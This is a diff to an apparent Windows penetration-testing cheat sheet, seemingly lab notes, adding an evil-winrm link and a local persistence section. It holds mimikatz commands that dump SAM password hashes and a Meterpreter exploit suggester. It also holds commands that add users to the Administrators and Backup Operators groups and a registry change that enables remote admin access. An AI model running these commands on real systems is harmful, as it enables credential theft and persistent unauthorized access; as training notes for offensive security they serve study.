@@ -40,6 +40,12 @@
 
 [process-hacker](https://soft98.ir/software/821-process-hacker.html)
 
+[evil-winrm](https://github.com/Hackplayers/evil-winrm)
+
+```shell
+https://github.com/Hackplayers/evil-winrm#Remote-path-completion)
+```
+
 ```bash
 meterpreter > run post/multi/recon/local_exploit_suggester
 ```
@@ -446,4 +452,15 @@ Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
 privilege::debug # this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
 token::elevate # simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges
 lsadump::sam # list of password
+```
+# Windows-Local-Persistence ✅
+```powershell
+net localgroup administrators thmuser0 /add
+net localgroup "Backup Operators" thmuser1 /add
+net localgroup "Remote Management Users" thmuser1 /add
+
+whoami /groups
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 
+
+
 ```
